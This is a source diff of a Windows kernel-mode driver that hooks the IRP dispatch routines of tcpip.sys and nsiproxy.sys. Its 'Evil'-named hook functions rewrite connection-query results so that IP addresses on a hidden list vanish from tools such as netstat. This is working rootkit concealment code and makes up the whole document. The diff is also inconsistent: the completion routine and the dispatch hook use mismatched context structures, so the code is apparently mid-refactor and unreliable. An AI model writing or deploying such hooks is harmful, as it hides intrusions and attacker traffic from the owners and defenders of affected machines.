@@ -1,188 +1,263 @@
 #include <intrin.h>
 #include "irp.h"
+#include "requests.h"
 #pragma warning(disable : 4996)
 #pragma warning(disable : 4302)
 #pragma warning(disable : 4311)
 #pragma warning(disable : 4127)
+#define ENDING_PORT 0xFFFFFFFF  // Invalid port, put at ending of the list
 
 
 // Global variables:
 PVOID TcpIpDispatchTable[IRP_MJ_MAXIMUM_FUNCTION + 1] = { 0 };
 PVOID NsiProxyDispatchTable[IRP_MJ_MAXIMUM_FUNCTION + 1] = { 0 };
-PVOID PortList = NULL;
-ULONG64 PortListSize = 0;
+PVOID AddressList = NULL;
+ULONG64 AddressListSize = 0;
+BOOL IsTcpIpHooked = FALSE;
+BOOL IsNsiProxyHooked = FALSE;
 
 
-NTSTATUS irphooking::port_list::InitializePortList() {
-	USHORT EndingPort = 65535;  // 0xFFFF
-	PortList = ExAllocatePoolWithTag(NonPagedPool, sizeof(USHORT), 'PlIh');
-	if (PortList == NULL) {
+NTSTATUS irphooking::address_list::InitializeAddressList() {
+	ULONG EndingAddress = 0xFFFFFFFF;
+	AddressList = ExAllocatePoolWithTag(NonPagedPool, sizeof(ULONG), 'AlIh');
+	if (AddressList == NULL) {
 		return STATUS_MEMORY_NOT_ALLOCATED;
 	}
-	PortListSize += sizeof(USHORT);
-	RtlCopyMemory(PortList, &EndingPort, sizeof(USHORT));
+	AddressListSize += sizeof(ULONG);
+	RtlCopyMemory(AddressList, &EndingAddress, sizeof(ULONG));
+	DbgPrintEx(0, 0, "KMDFdriver IRP - Initialized hidden address list in %p\n", AddressList);
 	return STATUS_SUCCESS;
 }
 
 
-NTSTATUS irphooking::port_list::AddToPortList(USHORT Port) {
-	PVOID TemporaryPortList = NULL;
-	USHORT EndingPort = 65535;  // 0xFFFF
-	TemporaryPortList = ExAllocatePoolWithTag(NonPagedPool, PortListSize + sizeof(USHORT), 'PlIh');
-	if (TemporaryPortList == NULL) {
+NTSTATUS irphooking::address_list::AddToAddressList(ULONG IpAddress) {
+	PVOID TemporaryAddressList = NULL;
+	ULONG EndingAddress = ENDING_PORT;
+	TemporaryAddressList = ExAllocatePoolWithTag(NonPagedPool, AddressListSize + sizeof(ULONG), 'AlIh');
+	if (TemporaryAddressList == NULL) {
 		return STATUS_MEMORY_NOT_ALLOCATED;
 	}
-	RtlCopyMemory(TemporaryPortList, PortList, PortListSize - sizeof(USHORT));
-	ExFreePool(PortList);
-	PortList = TemporaryPortList;
-	RtlCopyMemory((PVOID)((ULONG64)PortList + PortListSize - sizeof(USHORT)), &Port, sizeof(USHORT));
-	RtlCopyMemory((PVOID)((ULONG64)PortList + PortListSize), &EndingPort, sizeof(USHORT));
-	PortListSize += sizeof(USHORT);
+	RtlCopyMemory(TemporaryAddressList, AddressList, AddressListSize - sizeof(ULONG));
+	ExFreePool(AddressList);
+	AddressList = TemporaryAddressList;
+	RtlCopyMemory((PVOID)((ULONG64)AddressList + AddressListSize - sizeof(ULONG)), &IpAddress, sizeof(ULONG));
+	RtlCopyMemory((PVOID)((ULONG64)AddressList + AddressListSize), &EndingAddress, sizeof(ULONG));
+	AddressListSize += sizeof(ULONG);
+	DbgPrintEx(0, 0, "KMDFdriver IRP - Added hidden IP address %lu to hidden list %p\n", IpAddress, AddressList);
+	irphooking::address_list::ListAllHiddenAddresses();
 	return STATUS_SUCCESS;
 }
 
 
-NTSTATUS irphooking::port_list::RemoveFromPortList(USHORT RemovePort, USHORT RemoveIndex) {
-	PVOID TemporaryPortList = NULL;
-	USHORT EndingPort = 65535;  // 0xFFFF
-	USHORT CurrentPort = 0;
-	USHORT PortIndex = 0;
+NTSTATUS irphooking::address_list::RemoveFromAddressList(ULONG RemoveAddress, USHORT RemoveIndex) {
+	PVOID TemporaryAddressList = NULL;
+	ULONG EndingAddress = ENDING_PORT;
+	ULONG CurrentAddress = 0;
+	USHORT AddressIndex = 0;
 	USHORT InitialRemoveIndex = RemoveIndex;
-	if (RemovePort == REMOVE_BY_INDEX_PORT) {
-		if (RemoveIndex >= (PortListSize - sizeof(USHORT)) / sizeof(USHORT)) {
+	if (RemoveAddress == REMOVE_BY_INDEX_ADDR) {
+		if (RemoveIndex >= (AddressListSize - sizeof(ULONG)) / sizeof(ULONG)) {
 			return STATUS_INVALID_PARAMETER;
 		}
 	}
 	else {
-		if (RemovePort >= 65535) {
+		if (RemoveAddress == 0 || RemoveAddress == ENDING_PORT) {
 			return STATUS_INVALID_PARAMETER;
 		}
-		RtlCopyMemory(&CurrentPort, (PVOID)((ULONG64)PortList + (PortIndex * sizeof(USHORT))), sizeof(USHORT));
-		while (CurrentPort != 65535) {
-			if (CurrentPort == RemovePort) {
-				RemoveIndex = PortIndex;
+		RtlCopyMemory(&CurrentAddress, (PVOID)((ULONG64)AddressList + (AddressIndex * sizeof(ULONG))), sizeof(ULONG));
+		while (CurrentAddress != ENDING_PORT) {
+			if (CurrentAddress == RemoveAddress) {
+				RemoveIndex = AddressIndex;
 				break;
 			}
-			PortIndex++;
-			RtlCopyMemory(&CurrentPort, (PVOID)((ULONG64)PortList + (PortIndex * sizeof(USHORT))), sizeof(USHORT));
+			AddressIndex++;
+			RtlCopyMemory(&CurrentAddress, (PVOID)((ULONG64)AddressList + (AddressIndex * sizeof(ULONG))), sizeof(ULONG));
 		}
 		if (RemoveIndex == InitialRemoveIndex) {
 			return STATUS_INVALID_PARAMETER;
 		}
 	}
-	TemporaryPortList = ExAllocatePoolWithTag(NonPagedPool, PortListSize - sizeof(USHORT), 'PlIh');
-	if (TemporaryPortList == NULL) {
+	TemporaryAddressList = ExAllocatePoolWithTag(NonPagedPool, AddressListSize - sizeof(ULONG), 'AlIh');
+	if (TemporaryAddressList == NULL) {
 		return STATUS_MEMORY_NOT_ALLOCATED;
 	}
 
 
-	// Copy the existing data into the list without the removed port:
+	// Copy the existing data into the list without the removed address:
 	if (RemoveIndex == 0) {
-		RtlCopyMemory(TemporaryPortList, (PVOID)((ULONG64)PortList + sizeof(USHORT)), PortListSize - sizeof(USHORT));
+		RtlCopyMemory(TemporaryAddressList, (PVOID)((ULONG64)AddressList + sizeof(ULONG)), AddressListSize - sizeof(ULONG));
 	}
-	else if (RemoveIndex == (PortListSize - (2 * sizeof(USHORT))) / sizeof(USHORT)) {
-		RtlCopyMemory(TemporaryPortList, PortList, PortListSize - (2 * sizeof(USHORT)));
-		RtlCopyMemory((PVOID)((ULONG64)TemporaryPortList + PortListSize - (2 * sizeof(USHORT))), 
-			&EndingPort, sizeof(USHORT));
+	else if (RemoveIndex == (AddressListSize - (2 * sizeof(ULONG))) / sizeof(ULONG)) {
+		RtlCopyMemory(TemporaryAddressList, AddressList, AddressListSize - (2 * sizeof(ULONG)));
+		RtlCopyMemory((PVOID)((ULONG64)TemporaryAddressList + AddressListSize - (2 * sizeof(ULONG))),
+			&EndingAddress, sizeof(ULONG));
 	}
 	else {
-		RtlCopyMemory(TemporaryPortList, PortList, RemoveIndex * sizeof(USHORT));
-		RtlCopyMemory((PVOID)((ULONG64)TemporaryPortList + (RemoveIndex * sizeof(USHORT))),
-			(PVOID)((ULONG64)PortList + ((RemoveIndex + 1) * sizeof(USHORT))),
-			PortListSize - ((RemoveIndex + 1) * sizeof(USHORT)));
+		RtlCopyMemory(TemporaryAddressList, AddressList, RemoveIndex * sizeof(ULONG));
+		RtlCopyMemory((PVOID)((ULONG64)TemporaryAddressList + (RemoveIndex * sizeof(ULONG))),
+			(PVOID)((ULONG64)AddressList + ((RemoveIndex + 1) * sizeof(ULONG))),
+			AddressListSize - ((RemoveIndex + 1) * sizeof(ULONG)));
 	}
-	ExFreePool(PortList);
-	PortList = TemporaryPortList;
-	PortListSize -= sizeof(USHORT);
+	ExFreePool(AddressList);
+	AddressList = TemporaryAddressList;
+	AddressListSize -= sizeof(ULONG);
 	return STATUS_SUCCESS;
 }
 
 
-NTSTATUS irphooking::port_list::ReturnPortList(PVOID* PortListOutput, ULONG64* PortListSizeOutput) {
-	if (PortList == NULL || PortListSize == 0) {
+NTSTATUS irphooking::address_list::ReturnAddressList(PVOID* AddressListOutput, ULONG64* AddressListSizeOutput) {
+	if (AddressList == NULL || AddressListSize == 0) {
 		return STATUS_UNSUCCESSFUL;
 	}
-	if (PortListOutput != NULL) {
-		*PortListOutput = PortList;
+	if (AddressListOutput != NULL) {
+		*AddressListOutput = AddressList;
 	}
-	if (PortListSizeOutput != NULL) {
-		*PortListSizeOutput = PortListSize;
+	if (AddressListSizeOutput != NULL) {
+		*AddressListSizeOutput = AddressListSize;
 	}
 	return STATUS_SUCCESS;
 }
 
 
-BOOL irphooking::port_list::CheckIfInPortList(USHORT CheckPort, int* IndexInList) {
-	USHORT CurrentPort = 0;
-	int PortIndex = 0;
-	if (PortList == NULL || CheckPort == 0 || CheckPort >= 65535) {
+void irphooking::address_list::ListAllHiddenAddresses() {
+	ULONG CurrentAddress = 0;
+	USHORT AddressIndex = 0;
+	WCHAR CurrentIpAddress[MAX_PATH] = { 0 };
+	UNICODE_STRING CurrentUnicodeAddress = { 0 };
+
+	if (AddressList != NULL && AddressListSize != 0) {
+		DbgPrintEx(0, 0, "KMDFdriver IRP - Listing hidden IP addresses:\n");
+		RtlCopyMemory(&CurrentAddress, AddressList, sizeof(ULONG));
+		while (CurrentAddress != ENDING_PORT) {
+			if(general_helpers::CalculateAddressString(CurrentIpAddress, CurrentAddress)){
+				CurrentUnicodeAddress.Buffer = CurrentIpAddress;
+				CurrentUnicodeAddress.Length = (USHORT)wcslen(CurrentIpAddress) * sizeof(WCHAR);
+				CurrentUnicodeAddress.MaximumLength = (USHORT)(wcslen(CurrentIpAddress) + 1) * sizeof(WCHAR);
+				DbgPrintEx(0, 0, "IP address number %hu: %wZ / 0x%X\n", AddressIndex,
+					&CurrentUnicodeAddress, CurrentAddress);
+				RtlZeroMemory(CurrentIpAddress, MAX_PATH);
+			}
+			else {
+				DbgPrintEx(0, 0, "IP address number %hu: 0x%X, address unresolved\n", AddressIndex, 
+					CurrentAddress);
+			}
+			AddressIndex++;
+			RtlCopyMemory(&CurrentAddress, (PVOID)((ULONG64)AddressList + (AddressIndex * sizeof(ULONG))), sizeof(ULONG));
+		}
+		if (AddressIndex == 0) {
+			DbgPrintEx(0, 0, "No hidden IP addresses\n");
+		}
+	}
+	else {
+		DbgPrintEx(0, 0, "KMDFdriver IRP - IP address list is uninitialized\n");
+	}
+}
+
+
+BOOL irphooking::address_list::CheckIfInAddressList(ULONG CheckAddress, int* IndexInList) {
+	ULONG CurrentAddress = 0;
+	int AddressIndex = 0;
+	if (AddressList == NULL || CheckAddress == ENDING_PORT) {
 		if (IndexInList != NULL) {
 			*IndexInList = -1;
 		}
-		return FALSE;  // Invalid port number / empty port list, nothing to hide
+		return FALSE;  // Invalid address value / empty IP addresses list, nothing to hide
 	}
-	RtlCopyMemory(&CurrentPort, (PVOID)((ULONG64)PortList + (PortIndex * sizeof(USHORT))), sizeof(USHORT));
-	while (CurrentPort != 65535) {
-		if (CurrentPort == CheckPort) {
+	RtlCopyMemory(&CurrentAddress, AddressList, sizeof(ULONG));
+	while (CurrentAddress != ENDING_PORT) {
+		if (CurrentAddress == CheckAddress) {
 			if (IndexInList != NULL) {
-				*IndexInList = PortIndex;
+				*IndexInList = AddressIndex;
 			}
 			return TRUE;
 		}
-		PortIndex++;
-		RtlCopyMemory(&CurrentPort, (PVOID)((ULONG64)PortList + (PortIndex * sizeof(USHORT))), sizeof(USHORT));
+		AddressIndex++;
+		RtlCopyMemory(&CurrentAddress, (PVOID)((ULONG64)AddressList + (AddressIndex * sizeof(ULONG))), sizeof(ULONG));
 	}
-	return FALSE;  // Port does not exist in list
+	return FALSE;  // IP address does not exist in list
 }
 
 
 NTSTATUS irphooking::InitializeIrpHook(ULONG DriverTag, ULONG MajorFunction, PVOID HookingFunction) {
 	UNICODE_STRING DriverName = { 0 };
 	PDRIVER_OBJECT DriverObject = NULL;
+	PVOID OriginalFunction = NULL;
 	switch (DriverTag) {
 	case TCPIP_TAG:
-		RtlInitUnicodeString(&DriverName, L"\\Driver\\tcpip"); break;
+		if (!NT_SUCCESS(unicode_helpers::InitiateUnicode(L"\\Driver\\tcpip", 'TdTb',
+			&DriverName)) || DriverName.Buffer == NULL) {
+			DbgPrintEx(0, 0, "KMDFdriver IRP - Cannot initiate unicode string for \\Driver\\tcpip\n");
+			return STATUS_UNSUCCESSFUL;
+		}
+		break;
+
 	case NSIPROXY_TAG:
-		RtlInitUnicodeString(&DriverName, L"\\Driver\\nsiproxy"); break;
+		if (!NT_SUCCESS(unicode_helpers::InitiateUnicode(L"\\Driver\\nsiproxy", 'TdNb',
+			&DriverName)) || DriverName.Buffer == NULL) {
+			DbgPrintEx(0, 0, "KMDFdriver IRP - Cannot initiate unicode string for \\Driver\\nsiproxy\n");
+			return STATUS_UNSUCCESSFUL;
+		}
+		break;
 	default:
 		return STATUS_INVALID_PARAMETER;
 	}
+	DbgPrintEx(0, 0, "KMDFdriver IRP hook - trying to hook on driver %wZ\n", &DriverName);
 
 
 	// Verify that IRP major function is not already hooked:
 	if (wcscmp(DriverName.Buffer, L"\\Driver\\tcpip") == 0) {
 		if (TcpIpDispatchTable[MajorFunction] != NULL) {
 			DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ is already hooked\n", MajorFunction, &DriverName);
-			RtlFreeUnicodeString(&DriverName);
+			unicode_helpers::FreeUnicode(&DriverName);
 			return STATUS_UNSUCCESSFUL;
 		}
 	}
-	else if (wcscmp(DriverName.Buffer, L"\\Driver\\nsiproxy") == 0) {
+	else {  // (wcscmp(DriverName.Buffer, L"\\Driver\\nsiproxy") == 0) {
 		if (NsiProxyDispatchTable[MajorFunction] != NULL) {
 			DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ is already hooked\n", MajorFunction, &DriverName);
-			RtlFreeUnicodeString(&DriverName);
+			unicode_helpers::FreeUnicode(&DriverName);
 			return STATUS_UNSUCCESSFUL;
 		}
 	}
+	DbgPrintEx(0, 0, "KMDFdriver IRP hook - Driver %wZ, major %lu has not been hooked yet\n", &DriverName, MajorFunction);
 
 
 	// Get driver object, log IRP original function and hook the IRP function:
 	DriverObject = general_helpers::GetDriverObjectADD(&DriverName);
 	if (DriverObject == NULL) {
 		DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ cannot be hooked, driver object cannot be resolved\n", MajorFunction, &DriverName);
-		RtlFreeUnicodeString(&DriverName);
+		unicode_helpers::FreeUnicode(&DriverName);
 		return STATUS_UNSUCCESSFUL;
 	}
+	DbgPrintEx(0, 0, "KMDFdriver IRP hook - Driver object is at %p\n", DriverObject);
+	OriginalFunction = DriverObject->MajorFunction[MajorFunction];
 	if (wcscmp(DriverName.Buffer, L"\\Driver\\tcpip") == 0) {
 		TcpIpDispatchTable[MajorFunction] = DriverObject->MajorFunction[MajorFunction];
+		DbgPrintEx(0, 0, "KMDFdriver IRP hook - Saved %lu of TcpIp.sys, %p\n", MajorFunction, DriverObject->MajorFunction[MajorFunction]);
+		IsTcpIpHooked = TRUE;
 	}
-	else if (wcscmp(DriverName.Buffer, L"\\Driver\\nsiproxy") == 0) {
+	else { // if (wcscmp(DriverName.Buffer, L"\\Driver\\nsiproxy") == 0) {
 		NsiProxyDispatchTable[MajorFunction] = DriverObject->MajorFunction[MajorFunction];
+		DbgPrintEx(0, 0, "KMDFdriver IRP hook - Saved %lu of NsiProxy.sys, %p\n", MajorFunction, DriverObject->MajorFunction[MajorFunction]);
+		IsNsiProxyHooked = TRUE;
 	}
-	InterlockedExchange64((LONG64*)(&(DriverObject->MajorFunction[MajorFunction])),
+	InterlockedExchange64((volatile long long*)(&(DriverObject->MajorFunction[MajorFunction])),
 		(LONG64)HookingFunction);
-	DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ was hooked successfully to %p\n", MajorFunction, &DriverName, HookingFunction);
-	RtlFreeUnicodeString(&DriverName);
+	DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ was hooked successfully to %p, current value = %p\n",
+		MajorFunction, &DriverName, HookingFunction, *(&(DriverObject->MajorFunction[MajorFunction])));
+	if ((ULONG64)OriginalFunction == (ULONG64)*(&(DriverObject->MajorFunction[MajorFunction]))) {
+		DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ failed, current value = original function (%p)\n", 
+			MajorFunction, &DriverName, OriginalFunction);
+		unicode_helpers::FreeUnicode(&DriverName);
+		return STATUS_UNSUCCESSFUL;
+	}
+	if ((ULONG64)HookingFunction != (ULONG64)*(&(DriverObject->MajorFunction[MajorFunction]))) {
+		DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ failed, current value (%p) != hooking function (%p)\n",
+			MajorFunction, &DriverName, *(&(DriverObject->MajorFunction[MajorFunction])), OriginalFunction);
+		unicode_helpers::FreeUnicode(&DriverName);
+		return STATUS_UNSUCCESSFUL;
+	}
+	unicode_helpers::FreeUnicode(&DriverName);
 	return STATUS_SUCCESS;
 }
 
@@ -190,20 +265,41 @@ NTSTATUS irphooking::InitializeIrpHook(ULONG DriverTag, ULONG MajorFunction, PVO
 NTSTATUS irphooking::ReleaseIrpHook(ULONG DriverTag, ULONG MajorFunction) {
 	UNICODE_STRING DriverName = { 0 };
 	PDRIVER_OBJECT DriverObject = NULL;
-	switch (DriverTag) {
-	case TCPIP_TAG:
-		RtlInitUnicodeString(&DriverName, L"\\Driver\\tcpip"); break;
-	case NSIPROXY_TAG:
-		RtlInitUnicodeString(&DriverName, L"\\Driver\\nsiproxy"); break;
-	default:
-		return STATUS_INVALID_PARAMETER;
+	
+
+	// Delete all remains of address list:
+	if (AddressList != NULL) {
+		ExFreePool(AddressList);
+		AddressList = NULL;
 	}
 
 
-	// Delete all remains of port list:
-	if (PortList != NULL) {
-		ExFreePool(PortList);
-		PortList = NULL;
+	// Set up parameters for unhooking:
+	switch (DriverTag) {
+	case TCPIP_TAG:
+		if (!NT_SUCCESS(unicode_helpers::InitiateUnicode(L"\\Driver\\tcpip", 'TdTb',
+			&DriverName)) || DriverName.Buffer == NULL) {
+			DbgPrintEx(0, 0, "KMDFdriver IRP - Cannot initiate unicode string for \\Driver\\tcpip\n");
+			return STATUS_UNSUCCESSFUL;
+		}
+		if (!IsTcpIpHooked) {
+			return STATUS_SUCCESS;
+		}
+		break;
+
+	case NSIPROXY_TAG:
+		if (!NT_SUCCESS(unicode_helpers::InitiateUnicode(L"\\Driver\\nsiproxy", 'TdNb',
+			&DriverName)) || DriverName.Buffer == NULL) {
+			DbgPrintEx(0, 0, "KMDFdriver IRP - Cannot initiate unicode string for \\Driver\\nsiproxy\n");
+			return STATUS_UNSUCCESSFUL;
+		}
+		if (!IsNsiProxyHooked) {
+			return STATUS_SUCCESS;
+		}
+		break;
+
+	default:
+		return STATUS_INVALID_PARAMETER;
 	}
 
 
@@ -211,14 +307,14 @@ NTSTATUS irphooking::ReleaseIrpHook(ULONG DriverTag, ULONG MajorFunction) {
 	if (wcscmp(DriverName.Buffer, L"\\Driver\\tcpip") == 0) {
 		if (TcpIpDispatchTable[MajorFunction] == NULL) {
 			DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ is not hooked when trying to release\n", MajorFunction, &DriverName);
-			RtlFreeUnicodeString(&DriverName);
+			unicode_helpers::FreeUnicode(&DriverName);
 			return STATUS_UNSUCCESSFUL;
 		}
 	}
 	else if (wcscmp(DriverName.Buffer, L"\\Driver\\nsiproxy") == 0) {
 		if (NsiProxyDispatchTable[MajorFunction] == NULL) {
 			DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ is not hooked when trying to release\n", MajorFunction, &DriverName);
-			RtlFreeUnicodeString(&DriverName);
+			unicode_helpers::FreeUnicode(&DriverName);
 			return STATUS_UNSUCCESSFUL;
 		}
 	}
@@ -228,19 +324,21 @@ NTSTATUS irphooking::ReleaseIrpHook(ULONG DriverTag, ULONG MajorFunction) {
 	DriverObject = general_helpers::GetDriverObjectADD(&DriverName);
 	if (DriverObject == NULL) {
 		DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ cannot be unhooked, driver object cannot be resolved\n", MajorFunction, &DriverName);
-		RtlFreeUnicodeString(&DriverName);
+		unicode_helpers::FreeUnicode(&DriverName);
 		return STATUS_UNSUCCESSFUL;
 	}
 	if (wcscmp(DriverName.Buffer, L"\\Driver\\tcpip") == 0) {
 		InterlockedExchange64((LONG64*)(&(DriverObject->MajorFunction[MajorFunction])),
 			(LONG64)TcpIpDispatchTable[MajorFunction]);
+		IsTcpIpHooked = FALSE;
 	}
 	else if (wcscmp(DriverName.Buffer, L"\\Driver\\nsiproxy") == 0) {
 		InterlockedExchange64((LONG64*)(&(DriverObject->MajorFunction[MajorFunction])),
 			(LONG64)NsiProxyDispatchTable[MajorFunction]);
+		IsNsiProxyHooked = FALSE;
 	}
 	DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ was unhooked successfully\n", MajorFunction, &DriverName);
-	RtlFreeUnicodeString(&DriverName);
+	unicode_helpers::FreeUnicode(&DriverName);
 	return STATUS_SUCCESS;
 }
 
@@ -249,82 +347,67 @@ NTSTATUS irphooking::EvilCompletionNsiProxy(
 	IN PDEVICE_OBJECT  DeviceObject,
 	IN PIRP  Irp,
 	IN PVOID  Context) {
-	NTSTATUS Status = STATUS_UNSUCCESSFUL;
-	PIO_STACK_LOCATION NextIrpStackLocation = IoGetNextIrpStackLocation(Irp);
-	PHP_CONTEXT CurrentIrpContext = (PHP_CONTEXT)Context;
-	PNSI_PARAM NsiDriverParams = NULL;
-	KAPC_STATE CurrentProcessApcState = { 0 };
-	PNSI_STATUS_ENTRY ConnectionStatusEntry = NULL;
-	PINTERNAL_TCP_TABLE_ENTRY TcpConnectionEntry = NULL;
-	int CurrentConnectionIndex = 0;
-	int TotalTcpConnections = 0;
-	int IndexOfPortInHiddenList = 0;
-
-	if (NT_SUCCESS(Irp->IoStatus.Status)) {
-
-		// Request succeeded in the whole driver stack
-		NsiDriverParams = (PNSI_PARAM)Irp->UserBuffer;  // User provided buffer
-		if (MmIsAddressValid(NsiDriverParams->lpMem)) {
-
-			// Tools like netstat will invoke a call to nsiproxy.sys and will provide parameters in the NSI_PARAM struct
-			if ((NsiDriverParams->UnknownParam8 == 0x38)) {
-
-				// Unknown value, probably here for querying connections (like a request type)
-				ConnectionStatusEntry = (PNSI_STATUS_ENTRY)NsiDriverParams->lpStatus;
-				TcpConnectionEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiDriverParams->lpMem;
-				TotalTcpConnections = NsiDriverParams->TcpConnCount;  // Tcp connections count
+	PIO_STACK_LOCATION IrpStackLocation = IoGetNextIrpStackLocation(Irp);
+	KAPC_STATE ProcessApcState = { 0 };
+	PHOOKED_IO_COMPLETION FakeContext = (PHOOKED_IO_COMPLETION)Context;
+	PNSI_STRUCTURE_1 UserParameters = (PNSI_STRUCTURE_1)Irp->UserBuffer;
+	PNSI_STRUCTURE_ENTRY NsiIPEntries = &(UserParameters->Entries->EntriesStart[0]);;
+	int IndexOfAddressInList = -1;
+	USHORT ZeroHideCount = 0;
 
 
-				KeStackAttachProcess(CurrentIrpContext->pcb,
-					&CurrentProcessApcState);  // Attach to the requesting process running context
+	// Error before my driver:
+	if (!NT_SUCCESS(Irp->IoStatus.Status)) {
+		goto PassToNext;
+	}
 
 
-				//make sure we are in the context of original process
-				for (CurrentConnectionIndex = 0;
-					CurrentConnectionIndex < TotalTcpConnections;
-					CurrentConnectionIndex++) {
-					if (irphooking::port_list::CheckIfInPortList(TcpConnectionEntry[CurrentConnectionIndex].localEntry.Port,
-						&IndexOfPortInHiddenList)) {
+	// Address of IP entries buffer is not a valid address / entry size does not match the expected:
+	if (!MmIsAddressValid(UserParameters->Entries)) {
+		goto PassToNext;
+	}
+	if (UserParameters->EntrySize != sizeof(NSI_STRUCTURE_ENTRY)) {
+		goto PassToNext;
+	}
 
-						/*
-						nsiproxy.sys driver maps the status of all connections
-						to the actual TCP connections, need to modify them both
-						Synchronicly:
-						copy the next entries in the list to the placement in memory of
-						the current entry to hide and reduce counters
-						*/
-						RtlCopyMemory(&TcpConnectionEntry[CurrentConnectionIndex],
-							&TcpConnectionEntry[CurrentConnectionIndex + 1],
-							sizeof(INTERNAL_TCP_TABLE_ENTRY) * (TotalTcpConnections - CurrentConnectionIndex));
 
-						RtlCopyMemory(&ConnectionStatusEntry[CurrentConnectionIndex],
-							&ConnectionStatusEntry[CurrentConnectionIndex + 1],
-							sizeof(NSI_STATUS_ENTRY) * (TotalTcpConnections - CurrentConnectionIndex));
-						TotalTcpConnections--;  // Reduce the count of total connections
-						NsiDriverParams->TcpConnCount--;  // Reduce the connection count
-						CurrentConnectionIndex--;  // Next will be at the current index
-					}
-				}
-				KeUnstackDetachProcess(&CurrentProcessApcState);  // Detach from the calling process
+	// Attach to the requesting process and iterate IP address list:
+	KeStackAttachProcess(FakeContext->RequestingProcess, &ProcessApcState);
+	for (ULONG IpAddrIndex = 0; IpAddrIndex < UserParameters->NumberOfEntries; IpAddrIndex++) {
+		if (irphooking::address_list::CheckIfInAddressList(NsiIPEntries[IpAddrIndex].IpAddress,
+			&IndexOfAddressInList) && IndexOfAddressInList != -1) {
+			
+			// Found IP address to hide, zero memory out:
+			if (NsiIPEntries[IpAddrIndex].IpAddress == 0) {
+				ZeroHideCount++;
 			}
+			else {
+				DbgPrintEx(0, 0, "KMDFdriver IRP - \\Driver\\nsiproxy device control, hiding ip 0x%X, index %lu, placement %lu in list\n",
+					NsiIPEntries[IpAddrIndex].IpAddress, IpAddrIndex, (ULONG)IndexOfAddressInList);
+			}
+			RtlZeroMemory(&NsiIPEntries[IpAddrIndex], sizeof(NSI_STRUCTURE_ENTRY));
 		}
 	}
-
+	if (ZeroHideCount > 0) {
+		DbgPrintEx(0, 0, "KMDFdriver IRP - \\Driver\\nsiproxy device control, found and hid address 0x0 %hu times\n",
+			ZeroHideCount);
+	}
+	KeUnstackDetachProcess(&ProcessApcState);
+	
 
 	// Provide the context and I/O  for the next IRP in the next driver in the stack:
-	NextIrpStackLocation->Context = CurrentIrpContext->oldCtx;
-	NextIrpStackLocation->CompletionRoutine = CurrentIrpContext->oldIocomplete;
-	if (CurrentIrpContext->bShouldInvolve) {
-		Status = NextIrpStackLocation->CompletionRoutine(DeviceObject, Irp, Context);
+	PassToNext:
+	IrpStackLocation->Context = FakeContext->OriginalContext;
+	IrpStackLocation->CompletionRoutine = FakeContext->OriginalCompletionRoutine;
+	if (FakeContext->InvokeOnSuccess && IoGetNextIrpStackLocation(Irp)->CompletionRoutine) {
+		ExFreePool(FakeContext);
+		return IrpStackLocation->CompletionRoutine(DeviceObject, Irp, Context);
 	}
-	else if (Irp->PendingReturned) {
+	ExFreePool(FakeContext);
+	if (Irp->PendingReturned) {
 		IoMarkIrpPending(Irp);
 	}
-
-
-	// Free the fake context (created in EvilMajorDeviceControlNsiProxy):
-	ExFreePool(Context);
-	return Status;
+	return STATUS_SUCCESS;
 }
 
 
@@ -335,12 +418,9 @@ NTSTATUS irphooking::EvilMajorDeviceControlNsiProxy(IN PDEVICE_OBJECT DeviceObje
 	MajorDeviceControlNsiProxy MajorDeviceControlNsiProxyFunction = NULL;
 	PHP_CONTEXT FakeContext = NULL;
 	IrpStackLocation = IoGetCurrentIrpStackLocation(Irp);
-
 	IrpIoControlCode = IrpStackLocation->Parameters.DeviceIoControl.IoControlCode;
-
-	if (IrpIoControlCode == IOCTL_NSI_GETALLPARAM) {
-		if (IrpStackLocation->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_PARAM)) {
-			
+	if (IrpIoControlCode == IOCTL_NSI_QUERYCONNS) {
+		if (IrpStackLocation->Parameters.DeviceIoControl.InputBufferLength == NSI_PARAMS_LENGTH) {
 			/*
 			If call to driver is relevant to hiding ports :
 			1) Hook the completion routine of the IRP
@@ -354,7 +434,6 @@ NTSTATUS irphooking::EvilMajorDeviceControlNsiProxy(IN PDEVICE_OBJECT DeviceObje
 				IrpStackLocation->CompletionRoutine = &irphooking::EvilCompletionNsiProxy;
 				IrpStackLocation->Context = FakeContext;
 				FakeContext->pcb = IoGetCurrentProcess();
-
 				if ((IrpStackLocation->Control & SL_INVOKE_ON_SUCCESS) == SL_INVOKE_ON_SUCCESS) {
 					FakeContext->bShouldInvolve = TRUE;
 				}
